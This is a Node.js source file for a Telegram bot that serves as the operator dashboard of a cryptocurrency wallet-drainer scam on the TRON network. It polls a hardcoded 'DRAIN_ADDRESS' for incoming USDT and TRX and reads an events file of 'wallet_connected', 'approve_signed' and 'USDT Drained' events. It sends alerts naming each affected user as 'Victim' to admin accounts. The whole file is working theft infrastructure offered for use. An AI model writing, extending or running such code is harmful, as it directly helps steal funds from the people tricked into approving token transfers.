require('dotenv').config({ path: require('path').join(__dirname, '..', '.env') });
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const ADMIN_IDS = (process.env.TELEGRAM_ADMIN_IDS || '').split(',').map(s => s.trim()).filter(Boolean);

if (!BOT_TOKEN) {
  console.error('TELEGRAM_BOT_TOKEN not set in .env');
  process.exit(1);
}
if (!ADMIN_IDS.length) {
  console.error('TELEGRAM_ADMIN_IDS not set in .env (comma-separated)');
  process.exit(1);
}

const DRAIN_ADDRESS = process.env.DRAIN_ADDRESS || 'TVZmtMZZcZ4biKsncA8S7AvrnapNj7FViZ';
const USDT_CONTRACT = process.env.USDT_CONTRACT || 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const TRONGRID = 'https://api.trongrid.io';
const STATE_FILE = path.join(__dirname, 'state.json');
const EVENTS_FILE = path.join(__dirname, '..', 'events.json');
const POLL_INTERVAL = 15000;

let state = { lastTxId: null, knownBalance: '0', lastEventTime: Date.now() };
if (fs.existsSync(STATE_FILE)) {
  try {
    const loaded = JSON.parse(fs.readFileSync(STATE_FILE, 'utf8'));
    state = { ...state, ...loaded };
  } catch(e) {}
}

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

function isAdmin(userId) {
  return ADMIN_IDS.includes(String(userId));
}

function fmtAddr(addr) {
  return addr ? addr.slice(0, 6) + '...' + addr.slice(-4) : 'N/A';
}

function fmtTime(ts) {
  const d = new Date(ts);
  return d.toISOString().replace('T', ' ').slice(0, 19) + ' UTC';
}

function escMd(text) {
  return String(text).replace(/([_*\[\]()~`>#+\-=|{}.!])/g, '\\$1');
}

async function fetchTron(path, body) {
  const url = TRONGRID + path;
  const opts = { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) };
  try {
    const res = await fetch(url, opts);
    return await res.json();
  } catch(e) {
    return null;
  }
}

async function getUsdtBalance(address) {
  const data = await fetchTron('/wallet/triggersmartcontract', {
    contract_address: USDT_CONTRACT,
    function_selector: 'balanceOf(address)',
    parameter: address,
    visible: true
  });
  if (data && data.result && data.constant_result && data.constant_result[0]) {
    return BigInt(data.constant_result[0]);
  }
  return 0n;
}

async function getRecentTransactions() {
  try {
    const url = `${TRONGRID}/v1/accounts/${DRAIN_ADDRESS}/transactions?limit=20&order_by=block_timestamp,desc`;
    const res = await fetch(url);
    const data = await res.json();
    return data.data || [];
  } catch(e) {
    return [];
  }
}

function extractUsdtTransfers(tx) {
  const transfers = [];
  try {
    const contracts = tx.raw_data?.contract || [];
    for (const c of contracts) {
      if (c.type === 'TriggerSmartContract') {
        const val = c.parameter.value;
        const data = val.data || '';
        const toAddr = val.contract_address ? 'T' + val.contract_address.slice(2) : '';
        if (toAddr === USDT_CONTRACT && data.startsWith('a9059cbb')) {
          const toHex = '41' + data.slice(32, 72);
          const amountHex = data.slice(72, 136);
          const toBase58 = hexToBase58(toHex);
          const amount = BigInt('0x' + amountHex);
          if (toBase58 === DRAIN_ADDRESS && amount > 0n) {
            transfers.push({
              from: tx.raw_data?.contract?.[0]?.parameter?.value?.owner_address
                ? 'T' + tx.raw_data.contract[0].parameter.value.owner_address.slice(2)
                : 'unknown',
              amount,
              txId: tx.txID,
              time: tx.block_timestamp || tx.raw_data?.timestamp || 0,
              block: tx.blockNumber
            });
          }
        }
      }
    }
    if (tx.raw_data?.contract?.[0]?.type === 'TransferContract') {
      const val = tx.raw_data.contract[0].parameter.value;
      const toBase58 = hexToBase58(val.to_address);
      if (toBase58 === DRAIN_ADDRESS && val.amount > 0n) {
        transfers.push({
          from: hexToBase58(val.owner_address),
          amount: BigInt(val.amount) / 1000000n,
          txId: tx.txID,
          time: tx.block_timestamp || tx.raw_data?.timestamp || 0,
          block: tx.blockNumber,
          isTrx: true
        });
      }
    }
  } catch(e) {}
  return transfers;
}

function hexToBase58(hexStr) {
  const TronWeb = require('tronweb');
  try {
    return TronWeb.address.fromHex(hexStr);
  } catch(e) {
    return hexStr;
  }
}

async function checkNewTransfers() {
  const txs = await getRecentTransactions();
  let newTransfers = [];

  for (const tx of txs) {
    if (state.lastTxId && tx.txID === state.lastTxId) break;
    if (!state.lastTxId) {
      state.lastTxId = txs[0]?.txID;
      state.knownBalance = (await getUsdtBalance(DRAIN_ADDRESS)).toString();
      fs.writeFileSync(STATE_FILE, JSON.stringify(state));
      return;
    }
    const transfers = extractUsdtTransfers(tx);
    newTransfers = newTransfers.concat(transfers);
  }

  if (txs.length > 0) {
    state.lastTxId = txs[0].txID;
  }

  for (const t of newTransfers) {
    const token = t.isTrx ? 'TRX' : 'USDT';
    const amountFormatted = t.isTrx
      ? (Number(t.amount) / 1e6).toFixed(2)
      : (Number(t.amount) / 1e6).toFixed(2);

    const msg = [
      '🚀 *New Transfer Received*',
      '',
      '━━━━━━━━━━━━━━━━',
      '',
      `📦 *Token:* ${escMd(token)}`,
      `💰 *Amount:* ${escMd(amountFormatted)} ${escMd(token)}`,
      `📤 *From:* \`${t.from}\``,
      `📥 *To:* \`${DRAIN_ADDRESS}\``,
      `🔗 *TX:* [Tronscan](https://tronscan.org/#/transaction/${t.txId})`,
      `🕐 *Time:* ${escMd(fmtTime(t.time))}`,
      `⛓ *Block:* ${escMd(String(t.block || 'N/A'))}`,
      '',
      '━━━━━━━━━━━━━━━━',
      '',
      `📊 *Wallet:* \`${fmtAddr(DRAIN_ADDRESS)}\``
    ].join('\n');

    for (const adminId of ADMIN_IDS) {
      try {
        await bot.sendMessage(adminId, msg, {
          parse_mode: 'MarkdownV2',
          disable_web_page_preview: true
        });
      } catch(e) {
        console.error('Send error to', adminId, e.message);
      }
    }
  }

  if (newTransfers.length > 0) {
    const newBal = await getUsdtBalance(DRAIN_ADDRESS);
    state.knownBalance = newBal.toString();
  }

  fs.writeFileSync(STATE_FILE, JSON.stringify(state));
}

async function checkEvents() {
  try {
    if (!fs.existsSync(EVENTS_FILE)) return;
    const data = fs.readFileSync(EVENTS_FILE, 'utf8');
    const events = JSON.parse(data);
    if (!events.length) return;

    const newEvents = events.filter(e => e.time > state.lastEventTime);
    if (!newEvents.length) return;

    newEvents.reverse();

    for (const e of newEvents) {
      let msg = '';
      if (e.type === 'wallet_connected') {
        msg = [
          '🔌 *Wallet Connected*',
          '',
          '━━━━━━━━━━━━━━━━',
          '',
          `👤 *Address:* \`${escMd(e.address)}\``,
          `🕐 *Time:* ${escMd(fmtTime(e.time))}`,
          '',
          '━━━━━━━━━━━━━━━━',
        ].join('\n');
      } else if (e.type === 'approve_signed') {
        msg = [
          '✅ *Approve Signed*',
          '',
          '━━━━━━━━━━━━━━━━',
          '',
          `👤 *Victim:* \`${escMd(e.address)}\``,
          `🔗 *TX:* [Tronscan](https://tronscan.org/#/transaction/${e.txId})`,
          `🕐 *Time:* ${escMd(fmtTime(e.time))}`,
          '',
          '━━━━━━━━━━━━━━━━',
        ].join('\n');
      } else if (e.type === 'drain_sent') {
        const amt = e.amount ? (Number(e.amount) / 1e6).toFixed(2) : '?';
        msg = [
          '💸 *USDT Drained*',
          '',
          '━━━━━━━━━━━━━━━━',
          '',
          `👤 *Victim:* \`${escMd(e.address)}\``,
          `💰 *Amount:* ${escMd(amt)} USDT`,
          `🔗 *TX:* [Tronscan](https://tronscan.org/#/transaction/${e.txId})`,
          `🕐 *Time:* ${escMd(fmtTime(e.time))}`,
          '',
          '━━━━━━━━━━━━━━━━',
        ].join('\n');
      }

      if (msg) {
        for (const adminId of ADMIN_IDS) {
          try {
            await bot.sendMessage(adminId, msg, {
              parse_mode: 'MarkdownV2',
              disable_web_page_preview: true
            });
          } catch(e) {
            console.error('Send error to', adminId, e.message);
          }
        }
      }
    }

    const maxTime = Math.max(...events.map(e => e.time));
    if (maxTime > state.lastEventTime) {
      state.lastEventTime = maxTime;
    }
    fs.writeFileSync(STATE_FILE, JSON.stringify(state));
  } catch(e) {
    console.error('checkEvents error:', e.message);
  }
}

bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const userId = String(msg.from.id);
  const text = (msg.text || '').trim();

  if (!isAdmin(userId)) {
    await bot.sendMessage(chatId,
      '⛔ *Access Denied*\n\nYou are not authorized to use this bot\\.',
      { parse_mode: 'MarkdownV2' }
    );
    return;
  }

  const parts = text.split(/\s+/);
  const cmd = parts[0].toLowerCase();

  if (cmd === '/start' || cmd === '/help') {
    await bot.sendMessage(chatId,
      '🟢 机器人在工作\n\nBot by @Serafim\\_Work1',
      { parse_mode: 'MarkdownV2' }
    );
  } else if (cmd === '/status') {
    const bal = await getUsdtBalance(DRAIN_ADDRESS);
    const trxData = await fetchTron('/wallet/getaccount', { address: DRAIN_ADDRESS, visible: true });
    const trxBal = trxData?.balance ? (trxData.balance / 1e6).toFixed(2) : '0.00';
    const usdtFormatted = (Number(bal) / 1e6).toFixed(2);

    const msg = [
      '📊 *Wallet Status*',
      '',
      '━━━━━━━━━━━━━━━━',
      '',
      `👤 *Address:* \`${DRAIN_ADDRESS}\``,
      `🪙 *USDT:* ${escMd(usdtFormatted)}`,
      `⚡ *TRX:* ${escMd(trxBal)}`,
      `🕐 *Updated:* ${escMd(fmtTime(Date.now()))}`,
      '',
      '━━━━━━━━━━━━━━━━',
      '',
      `🔗 [Tronscan](https://tronscan.org/#/address/${DRAIN_ADDRESS})`
    ].join('\n');

    await bot.sendMessage(chatId, msg, {
      parse_mode: 'MarkdownV2',
      disable_web_page_preview: true
    });
  } else if (cmd === '/history') {
    const txs = await getRecentTransactions();
    let found = 0;
    let result = '📜 *Last Incoming Transfers*\n\n';

    for (const tx of txs) {
      if (found >= 5) break;
      const transfers = extractUsdtTransfers(tx);
      for (const t of transfers) {
        if (found >= 5) break;
        const token = t.isTrx ? 'TRX' : 'USDT';
        const amt = t.isTrx ? (Number(t.amount) / 1e6).toFixed(2) : (Number(t.amount) / 1e6).toFixed(2);
        result += `━━━━━━━━━━\n`;
        result += `📦 *${token}*: ${escMd(amt)}\n`;
        result += `📤 *From:* \`${fmtAddr(t.from)}\`\n`;
        result += `🕐 ${escMd(fmtTime(t.time))}\n`;
        result += `🔗 [TX](${escMd('https://tronscan.org/#/transaction/' + t.txId)})\n`;
        found++;
      }
    }

    if (found === 0) {
      result += 'No incoming transfers found\\.';
    }

    await bot.sendMessage(chatId, result, {
      parse_mode: 'MarkdownV2',
      disable_web_page_preview: true
    });
  } else if (cmd === '/check') {
    await bot.sendMessage(chatId, '🔍 *Checking for new transfers\\.\\.\\.*', { parse_mode: 'MarkdownV2' });
    await checkNewTransfers();
    const bal = await getUsdtBalance(DRAIN_ADDRESS);
    await bot.sendMessage(chatId,
      `✅ *Check complete*\nCurrent USDT: ${escMd((Number(bal) / 1e6).toFixed(2))}`,
      { parse_mode: 'MarkdownV2' }
    );
  }
});

console.log('Bot running...');
console.log('Admin IDs:', ADMIN_IDS);

setInterval(checkEvents, POLL_INTERVAL);
setInterval(checkNewTransfers, POLL_INTERVAL);
checkEvents();
checkNewTransfers();
